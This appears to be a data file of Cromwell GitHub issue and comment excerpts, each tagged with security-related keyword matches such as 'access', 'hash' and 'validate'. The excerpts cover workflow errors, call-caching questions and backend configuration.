Security,"I have ; ```; java version ""1.8.0_172""; Java(TM) SE Runtime Environment (build 1.8.0_172-b11); ```; and I was getting ; ```; Exception in thread ""main"" java.lang.UnsupportedClassVersionError: org/hsqldb/jdbcDriver has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0; 	at java.lang.ClassLoader.defineClass1(Native Method); 	at java.lang.ClassLoader.defineClass(ClassLoader.java:763); 	at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142); 	at java.net.URLClassLoader.defineClass(URLClassLoader.java:467); 	at java.net.URLClassLoader.access$100(URLClassLoader.java:73); 	at java.net.URLClassLoader$1.run(URLClassLoader.java:368); 	at java.net.URLClassLoader$1.run(URLClassLoader.java:362); 	at java.security.AccessController.doPrivileged(Native Method); 	at java.net.URLClassLoader.findClass(URLClassLoader.java:361); 	at java.lang.ClassLoader.loadClass(ClassLoader.java:424); 	at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:349); 	at java.lang.ClassLoader.loadClass(ClassLoader.java:357); 	at com.zaxxer.hikari.HikariConfig.attemptFromContextLoader(HikariConfig.java:970); 	at com.zaxxer.hikari.HikariConfig.setDriverClassName(HikariConfig.java:480); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.$anonfun$forConfig$3(HikariCPJdbcDataSource.scala:33); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.$anonfun$forConfig$3$adapted(HikariCPJdbcDataSource.scala:33); 	at scala.Option.foreach(Option.scala:437); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.forConfig(HikariCPJdbcDataSource.scala:33); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.forConfig(HikariCPJdbcDataSource.scala:21); 	at slick.jdbc.JdbcDataSource$.forConfig(JdbcDataSource.scala:47); 	at slick.jdbc.JdbcBackend$DatabaseFactoryDef.forConfig(JdbcBackend.scala:341); 	at slick.jdbc.JdbcBackend$DatabaseFactoryDef.forConfig$(JdbcBackend.scala:337); 	at slick.jdbc.JdbcBackend$$",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6830:510,secur,security,510,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6830,6,"['Access', 'Secur', 'access', 'secur']","['AccessController', 'SecureClassLoader', 'access', 'security']"
Security,"I have a feeling the message is coming from an underlying Unix command like; ```; $ md5 ~; md5: /Users/anichols: Is a directory; ```; That said, the Cromwell product does seem to make a promise that it can hash & call-cache directories, and I am having trouble reconciling those two premises.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-671414437:206,hash,hash,206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-671414437,1,['hash'],['hash']
Security,"I have a following pipeline which fails validation, and I cannot see what can be wrong with it:. ```; version 1.0. ## ; # Git URL import; import ""https://raw.githubusercontent.com/DSLituiev/five-dollar-genome-analysis-pipeline/master/tasks/to_uBam.wdl"" as touBam. # WORKFLOW DEFINITION; workflow WGUnMap {; input {; File mapped_bam; String bam_base; }. call touBam.unMap {; input:; File mapped_bam=mapped_bam,; String unmapped_base=bam_base; }. # Outputs that will be retained when execution is complete; output {; File unmapped_bam = touBam.out; }; }; ```. The error is:; ```; java -jar `which womtool.jar` validate unmap.wdl; ERROR: Unexpected symbol (line 46, col 7) when parsing '_gen19'. Expected rbrace, got ""File"". File mapped_bam=mapped_bam,; ^. $call_body = :input :colon $_gen19 -> CallBody( inputs=$2 ); ```. Any ideas? Why brace is expected to be closed right after the colon?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5256:40,validat,validation,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5256,2,['validat'],"['validate', 'validation']"
Security,"I have a simple workflow with the following input cache structure:. ```json; {; ""String sampleName"": ""1B5BE2D031348FBA1A6E8624811B57E3"",; ""File reference"": ""1f6b1b1dff750c107f19d3fbc4c7ac90"",; ""File reference_bwt"": ""1f6b1b1dff750c107f19d3fbc4c7ac90"",; ""File reads"": [; ""fa22ef528d4abd40315c885e784ff6c2"",; ""df337314b38af64554899eb5ebe81c74""; ]; }; ```. When I rerun the workflow I purely get a `cacheMiss`, but the metadata comparison between two of the inputs gives the following error:. ```; {; ""status"": ""error"",; ""message"": ""Failed to calculate diff for call A and call B:\nFailed to extract relevant metadata for call A (f9a2bfe7-a173-439f-8c39-4bca22552a22 / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""ec4ed7c97d38063d4ad0587812c034e8\"",\""083ce2cf30923ff510378b1c63feb0b6\""]\nFailed to extract relevant metadata for call B (e6f82c61-4d10-4c7e-9122-815658bb874c / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""fa22ef528d4abd40315c885e784ff6c2\"",\""df337314b38af64554899eb5ebe81c74\""]"",; ""errors"": {; ""JsArray"": {; ""elements"": [; {; ""JsString"": {; ""value"": ""Failed to extract relevant metadata for call A (f9a2bfe7-a173-439f-8c39-4bca22552a22 / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""ec4ed7c97d38063d4ad0587812c034e8\"",\""083ce2cf30923ff510378b1c63feb0b6\""]""; }; },; {; ""JsString"": {; ""value"": ""Failed to extract relevant metadata for call B (e6f82c61-4d10-4c7e-9122-815658bb874c / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""fa22ef528d4abd40315c885e784ff6c2\"",\""df337314b38af64554899eb5ebe81c74\""]""; }; }; ]; }; }; }; ```. I presume this means that `processField` [[CallCacheDiffActor.scala#L164-L168](https://github.com/broadinstitute/cromwell/blob/8415afa3ee7ffe83",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5348:719,hash,hashes,719,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5348,2,['hash'],['hashes']
Security,"I have a wdl task that doesn't handle an optional parameter as it should.; The wdl validates (wdltool-0.8.jar), but when I submit to my server, an exception is thrown over and over again. ```; [ERROR] [01/10/2017 15:07:12.214] [cromwell-system-akka.actor.default-dispatcher-5] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-98777f84-7e; 14-4408-b31e-9b57db5d813b/WorkflowExecutionActor-98777f84-7e14-4408-b31e-9b57db5d813b/98777f84-7e14-4408-b31e-9b57db5d813b-EngineJobExecutionActor-snps.testHC:NA:1/98777f84-7e1; 4-4408-b31e-9b57db5d813b-BackendJobExecutionActor-98777f84:snps.testHC:-1:1/DispatchedConfigAsyncJobExecutionActor] DispatchedConfigAsyncJobExecutionActor [UUID(98777f84)snps.t; estHC:NA:1]: Error attempting to Execute; java.lang.UnsupportedOperationException: Could not find declaration for WdlOptionalValue(WdlStringType,None); at wdl4s.command.ParameterCommandPart.instantiate(ParameterCommandPart.scala:48); at wdl4s.Task$$anonfun$instantiateCommand$1$$anonfun$apply$2.apply(Task.scala:108); at wdl4s.Task$$anonfun$instantiateCommand$1$$anonfun$apply$2.apply(Task.scala:108); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); at scala.collection.Iterator$class.foreach(Iterator.scala:893); at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); at scala.collection.AbstractIterable.foreach(Iterable.scala:54); at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); at scala.collection.AbstractTraversable.map(Traversable.scala:104); at wdl4s.Task$$anonfun$instantiateCommand$1.apply(Task.scala:108); at wdl4s.Task$$anonfun$instantiateCommand$1.apply(Task.scala:108); at scala.util.Try$.apply(Try.scala:192); at wdl4s.Task.instantiateCommand(Task.scala:108); ...; ```. Restarting the service seems to be the only way of stoppin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1830:83,validat,validates,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1830,1,['validat'],['validates']
Security,"I have a workflow where one of the inputs was created by a brand-new version of a tool, but it had a cache-hit for a run from 2 months ago. I can only assume that this is because the new input file had the exact same hash as the old input file, but because the google bucket the old input file was in is gone, I have no way to confirm this. It seems like it would be fairly trivial, and extremely helpful, for this information to be contained in the call_caching_placeholder.txt, or some equivalent file when outputs are copied. Thanks!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681:217,hash,hash,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681,1,['hash'],['hash']
Security,"I have a working cromwell/AWS batch configuration.; I have a simple workflow called three_task_sequence.wdl which I am able to run on AWS backend, and see the outputs in s3. However, submitting this job to my cromwell server:; `curl -X POST ""http://172.20.1.67:8001/api/workflows/v1"" -H ""accept: application/json"" -F ""workflowSource=@three_task_sequence.wdl"" -F ""workflowOptions=@workflow_options.json""; `; Where workflow_options.json content is:; ```; {; ""final_workflow_outputs_dir"": ""s3://nrglab-cromwell-genomics/cromwell-execution/out_bin_test""; }. ```. I'm getting the following error at the end of the workflow cromwell log:. ````; 2019-02-28 08:30:32,167 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - Access Denied (Service: S3Client; Status Code: 403; Request ID: FA1C7E97A7A33EDC); software.amazon.awssdk.services.s3.model.S3Exception: Access Denied (Service: S3Client; Status Code: 403; Request ID: FA1C7E97A7A33EDC); 	at software.amazon.awssdk.core.http.pipeline.stages.HandleResponseStage.handleErrorResponse(HandleResponseStage.java:114); 	at software.amazon.awssdk.core.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:72); 	at software.amazon.awssdk.core.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:57); 	at software.amazon.awssdk.core.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:40); 	at software.amazon.awssdk.core.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:239); 	at software.amazon.awssdk.core.http.pipeline.stages.TimerExceptionHandlingStage.execute(TimerExceptionHandlingStage.java:40); 	at software.amazon.awssdk.core.http.pipeline.stages.TimerExceptionHandlingStage.execute(TimerExceptionHandlingStage.java:30); 	at software.amazon.awssdk.core.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:139); 	at software.amazon.awssdk.core.http.pipeline.stages.RetryableStage$RetryExecut",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686:725,Access,Access,725,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686,2,['Access'],['Access']
Security,"I have no reason to believe develop is any less stable today than it was a few weeks ago, but if anyone feels otherwise please speak up! . Branching GotC releases from a branch based at this hash means we'll need to put fixes on both the GotC branch and develop going forward. That will become increasingly difficult as these branches diverge. And eventually PBE Cromwell would be released with the full bolus of ported fixes that were never previously tested at scale.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198489018:191,hash,hash,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198489018,1,['hash'],['hash']
Security,"I have run both strategies with a workflow that generates around about 2000 jobs (100 samples) using GATK best practices for RNA variant calling. . ### Method. The Cromwell instance ran with a SLURM cluster backend. All jobs were run using singularity containers. The cromwell process was limited to 3 akka threads and 1 GC thread (by default it grabs al threads on the login node, and this is not fair to other users). The HSQLDB memory database with persistance file was used. Said SLURM cluster has its storage connected via NFS. Two configurations of cromwell were used. One with the xxh64 strategy, and one with the fingerprint strategy. Each cromwell instance was executed in its own directory, with its own database and own cromwell-executions folder. The [BioWDL RNA-seq](https://github.com/biowdl/rna-seq) workflow was run. After running, the workflow was run again to see if the call-caching worked correctly. ### Results; Both `xxh64` and `fingerprint` strategies were able to rerun the workflow with a 100% Cache hit. The fingerprint strategy however was much quicker:; `time` results for fingerprint; ```; real 23m26.269s; user 15m31.229s; sys 2m43.406s; ```; `time` results for xxh64; ```; real 69m12.478s; user 56m7.371s; sys 52m6.262s; ```. ### Conclusion; Using xxh64 as a strategy requires some calculation but one hour for 100 samples on 2000 jobs is quite acceptable. What is obvious is that the system IO (`sys` time) takes a lot of time as well. This cluster has very fast optimized ISILON storage, but on clusters without this, any hashing strategy can be quite slow because of this. The fingerprint works very well for HPC environments.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601604438:1555,hash,hashing,1555,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601604438,1,['hash'],['hashing']
Security,"I have run: ; Workflow: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-workflow.wdl; Inputs: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-inputs.json. Now three times directly with the same input data and every single time for every single task (so the file that is the result of the first task from a previous run of this workflow does not get reused for the second task fo the current run of the workflow, and so on for all the tasks in the entire workflow) I have gotten this:. ```; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": false,; ""result"": ""Cache Miss"",; ""hashes"": {; ""output count"": ""..."",; ""runtime attribute"": {; ""docker"": ""..."",; ""continueOnReturnCode"": ""..."",; ""failOnStderr"": ""...""; },; ""output expression"": {; ""File output_fastq"": ""..""; },; ""input count"": "".."",; ""backend name"": ""..."",; ""command template"": ""..."",; ""input"": {; ""String base_file_name"": ""..."",; ""File input_bam"": ""...""; }; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache""; ```. So it's not timing out anymore (I replaced hashes with '...'), but never, ever having a `""hit"": true`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457360546:730,hash,hashes,730,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457360546,2,['hash'],['hashes']
Security,"I have to note that I didn't make this configuration (@rhpvorderman will know more about this); This is in the backend section:; ```; caching {; duplication-strategy: [ ""soft-link"", ""copy"", ""hard-link"" ]; hashing-strategy: ""file""; }; ```; This is on the top level:; ```; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393886848:205,hash,hashing-strategy,205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393886848,1,['hash'],['hashing-strategy']
Security,"I have tried the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/) to run Cromwell on Google Cloud. I did not get very far. I have followed the long set of instructions. I have logged in with my `<google-user-id>`, I have set my own `<google-project-id>`. I have created my own bucket. I have generate my service account key with the command:; ```; gcloud iam service-accounts keys create sa.json --iam-account ""$EMAIL""; ```. Then I run the hello.wdl with the command:; ```; GOOGLE_APPLICATION_CREDENTIALS=sa.json; java -Dconfig.file=google.conf -jar cromwell-52.jar run hello.wdl -i hello.inputs; ```. But I get the following error:; ```; [2020-07-27 18:34:00,37] [error] PipelinesApiAsyncBackendJobExecutionActor [3d2d7a27wf_hello.hello:NA:1]: Error attempting to Execute; cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; Caused by: com.google.cloud.storage.StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.translate(HttpStorageRpc.java:227); 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.create(HttpStorageRpc.java:308); 	at com.google.cloud.storage.StorageImpl$3.call(StorageImpl.java:213); 	at com.google.cloud.storage.StorageImpl$3.call(StorageImpl.java:210); 	at com.google.api.gax.retrying.DirectRetryingExecutor.submit(DirectRetryingExecutor.java:105); 	at com.google.cloud.RetryHelper.run(RetryHelper.java:76); 	at com.google.cloud.RetryHelper.runWithRetries(RetryHelper.java:50); 	at com.google.cloud.storage.StorageImpl.internalCreate(StorageImpl.java:209); 	at com.google.cloud.storage.StorageImpl.create(StorageImpl.java:171); 	at cromwell.filesystems.gcs.GcsPath.request$1(GcsPathBuilder.scala:196); 	at cromwell.filesystems.gcs.GcsPath.$anonfun$writeContent$2",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594:979,access,access,979,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594,1,['access'],['access']
Security,"I have validated that the log file for each submitted workflow does not get closed when Cromwell is run in server mode and is configured with `workflow-log-temporary: false` and the workflow does not specify the `final_workflow_log_dir` option. I also have tested that Tony's fix above resolves the problem. While using a workflow options file is a workaround, it's not a general solution for debugging failed workflows submitted by users who did not include the options file to begin with. Even worse, the bug results in a file handle leak in Cromwell server. . Repro steps:. ```; # cromwell.conf; include required(classpath(""application"")); workflow-options {; # When true, per workflow logs will be deleted after copying; workflow-log-temporary: false; }; ```. Run: `java -Dconfig.file=cromwell.conf -jar cromwell.jar server` . Submit a simple Hello World .wdl file to /api/workflows (submit a couple times see the leak). We see that many log file handles remain unclosed:; `sudo lsof -p $(pidof java)`. ```; java 33951 cromwellbuild 33w REG 8,1 117 533080 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.11dbb9e7-10e3-48dc-b36f-0b7e35941ce3.log; java 33951 cromwellbuild 34w REG 8,1 1301 525688 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.0ed80fab-afd1-4783-9b27-409b75f0f2f7.log; java 33951 cromwellbuild 35w REG 8,1 117 533081 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.ef428f60-f8c3-4456-a3ea-bea63486881a.log; java 33951 cromwellbuild 36w REG 8,1 117 533085 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.4df4069e-0ef0-43ba-8bfb-37413d7ed229.log; java 33951 cromwellbuild 37w REG 8,1 117 533086 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.48e5c4ff-c067-465d-820b-2b41cb74ef31.log; java 33951 cromwellbuild 38w REG 8,1 117 533087 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.05bcd5a7-3924-4ba0-ab39-57bc09716abb.log; java 33951 cromwellbuild 39w REG 8,1 117 533088 /home/cromwellbuild/cromwell/cromw",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4826#issuecomment-499023273:7,validat,validated,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4826#issuecomment-499023273,2,['validat'],['validated']
Security,"I have write access so technically I can approve, but I’ll leave it to you and @cjllanwarne to decide if my review is enough to merge.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630626951:13,access,access,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630626951,1,['access'],['access']
Security,"I have written the necessary code for validation. However, optional inputs still show up in womtool inputs even if `meta {allowNestedInputs: false}` so I need to do some more coding to fix that. Will do that tomorrow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5523#issuecomment-634099775:38,validat,validation,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5523#issuecomment-634099775,1,['validat'],['validation']
Security,"I have zero idea whether this is the correct place to post an issue. The gatk forums [say to post here](https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team). There are messages here saying post on Jira?. I am attempting to set cromwell up to run with singularity. This is in an HPC environment with a brand new install of cromwell, where I don't have the ability to access or overwrite any global files, i.e. the application.conf file with all the defaults in it. It's a documentation issue rather than a problem with cromwell, which runs fine on the default configuration. . Documentation [here](https://cromwell.readthedocs.io/en/develop/tutorials/Containers/#singularity) suggests that I need to add code similar to that found [here](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/singularity.conf) to a config block of the backend.providers section in a configuration file similar to the file [cromwell.examples.conf](https://www.github.com/broadinstitute/cromwell/tree/develop/cromwell.examples.conf). Which, if you click that link, you'll see is broken. It might possibly be linked to [this issue](https://broadworkbench.atlassian.net/browse/BA-4810) on Jira?. As a result I have no idea what the conf file is supposed to look like, nor to be honest where it goes or how it's meant to be referenced. There's an issue [here](https://gatkforums.broadinstitute.org/wdl/discussion/12789/cromwell-configuration-on-slurm) which tells me I have to have ""include required(classpath(""application""))"" in the first line of the conf file, but apart from that I can't find anything on what the file should look like. . The documentation [here](https://cromwell.readthedocs.io/en/stable/tutorials/ConfigurationFiles/) and [here](https://cromwell.readthedocs.io/en/stable/Configuring/#overview) both suggest that the configuration files are for a server version of cromwell, whereas I have to run it from the command line, i.e. . ```; cromwell run <-o confi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5560:384,access,access,384,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5560,1,['access'],['access']
Security,"I haven't used this endpoint and I'm not entirely sure what the use case is. However, this new version seems less usable to me. I can no longer look up the differential by a key I'm interested in - I have to iterate over all elements looking for the one I want. This seems worse -- why use a map?. Also I don't really know why it's in an array. Why isn't it just:. ```; ""hashDifferential"": {; ""output expression:String hi”: ; {; ""callA"": ""935C6E7EB2068B83C40B788575747EFB”, ; ""callB"": “0183144CF6617D5341681C6B2F756046""; },; ""output thing:blah blah"": { ... },; ...; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2471#issuecomment-316752639:371,hash,hashDifferential,371,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2471#issuecomment-316752639,2,['hash'],['hashDifferential']
Security,I highly recommend using the dsde-toolbox method as it gives you access to the `vault-edit` command which is much less error prone,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2326#issuecomment-305899198:65,access,access,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2326#issuecomment-305899198,1,['access'],['access']
Security,"I just reran, Here is the log:. | 4773 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hashes:runtime attribute:docker | test.hello | NULL | 1 | 66E19F14150E71B0E42CA8557A69C5F9 | 2018-11-21 15:09:37.710000 | string |; | 4775 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hashes:runtime attribute:failOnStderr | test.hello | NULL | 1 | 68934A3E9455FA72420237EB05902327 | 2018-11-21 15:09:37.710000 | string |; | 4735 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | true | 2018-11-21 15:09:09.839000 | boolean |; | 4742 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | false | 2018-11-21 15:09:10.555000 | boolean |; | 4741 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:causedBy[] | test.hello | NULL | 1 | NULL | 2018-11-21 15:09:10.486000 | NULL |; | 4740 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:message | test.hello | NULL | 1 | The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.486000 | string |; | 4739 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:message | test.hello | NULL | 1 | [Attempted 1 time(s)] - NoSuchKeyException: The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.485000 | string |; | 4736 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Hit: 2f58eee9-1b0f-4436-a4ad-48eb305655e9:test.hello:-1 | 2018-11-21 15:09:09.839000 | string |; | 4743 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Miss | 2018-11-21 15:09:10.555000 | string |; | 4759 | 02306258-436a-4372-ab54-2dcd83c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029:92,hash,hashes,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029,2,['hash'],['hashes']
Security,"I just witnessed that too. I think it might be a problem with the docker container transiently not being able to authenticate calls to the google API, which results in failures to localize/delocalize. I'll bring it up to Google but for now the only workaround is to start the workflow again I'm afraid",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-437583991:113,authenticat,authenticate,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-437583991,1,['authenticat'],['authenticate']
Security,"I like the scheme of providing a standard functions library to do some common validations for a user. . I'm a little wary of listing backend-specific keys in that library though. In particular I don't want to give any backend developers the impression that either they (a) cannot use their own custom keys or (b) must use every ""standard"" key. But mostly, this looks good!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-210454891:78,validat,validations,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-210454891,1,['validat'],['validations']
Security,"I ran into the following problem when upgrading from cromwell 31.1 to 36. ; It looks like in cromwell 31.1, it is possible to pass a single File to a task that expects an Array[File]. In cromwell 36 however, this gives the following error: `Failed to evaluate input 'files' (reason 1 of 1): No coercion defined from wom value(s) '""cromwell-36.jar""' of type 'File' to 'Array[File]'.`; However, both womtool 31.1 and womtool 36 give no errors when validating the workflow. I'm not sure which of the two is the correct behaviour according to the WDL spec, but I think womtool and cromwell should agree on whether or not the wdl file is valid or not. Cromwell Womtool 31. $ java -jar womtool-31.jar validate wf.wdl ; ; $ java -jar cromwell-31.1.jar run --inputs wf.json wf.wdl ; [2019-01-15 15:07:53,81] [info] Running with database db.url = jdbc:hsqldb:mem:6b74f862-dc18-4cf1-8e2e-0b9002bba0bf;shutdown=false;hsqldb.tx=mvcc; .; .; [2019-01-15 15:08:11,54] [info] WorkflowExecutionActor-977d0c47-9cf5-4893-8dcf-465c27da13d7 [977d0c47]: Workflow wf complete. Final Outputs:; {; ""wf.F"": [[""/home/redmar/devel/wdl/test/issue/cromwell-executions/wf/977d0c47-9cf5-4893-8dcf-465c27da13d7/call-ls/shard-0/inputs/home/redmar/devel/wdl/test/issue/cromwell-31.1.jar""], [""/home/redmar/devel/wdl/test/issue/cromwell-executions/wf/977d0c47-9cf5-4893-8dcf-465c27da13d7/call-ls/shard-1/inputs/home/redmar/devel/wdl/test/issue/cromwell-36.jar""], [""/home/redmar/devel/wdl/test/issue/cromwell-executions/wf/977d0c47-9cf5-4893-8dcf-465c27da13d7/call-ls/shard-2/inputs/home/redmar/devel/wdl/test/issue/womtool-31.jar""], [""/home/redmar/devel/wdl/test/issue/cromwell-executions/wf/977d0c47-9cf5-4893-8dcf-465c27da13d7/call-ls/shard-3/inputs/home/redmar/devel/wdl/test/issue/womtool-36.jar""]]; }. Cromwell Womtool 36. $ java -jar womtool-36.jar validate wf.wdl ; ; $ java -jar cromwell-36.jar run --inputs wf.json wf.wdl ; [2019-01-15 15:09:17,10] [info] Running with database db.url = jdbc:hsqldb:mem:e77f2c21-f28a-4571-ba89-d9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4550:446,validat,validating,446,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4550,2,['validat'],"['validate', 'validating']"
Security,"I ran it using json ways and after configuring mysql and Call Caching it is still create a new project. here is my commands and config file. ```; java -jar -Dconfig.file=/work/share/ac7m4df1o5/bin/cromwell/3_config/udocker_slum.conf ../cromwell-84.jar run /work/share/ac7m4df1o5/bin/cromwell/1_pipeline/Exome_Germline_Single_Sample/ExomeGermlineSingleSample_v3.1.5.wdl -i D5327.NA12878.json -o ../options.json; ```. conf is. ```; include required(classpath(""application"")). docker {; hash-lookup {; enable = false; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }. backend {; default = slurm. providers {; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"" ; config {; 	concurrent-job-limit = 5; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? docker; """""". submit = """"""; sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -t ${runtime_minutes} \; 	 -p wzhcexclu06 \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""/bin/bash ${script}""; """""". 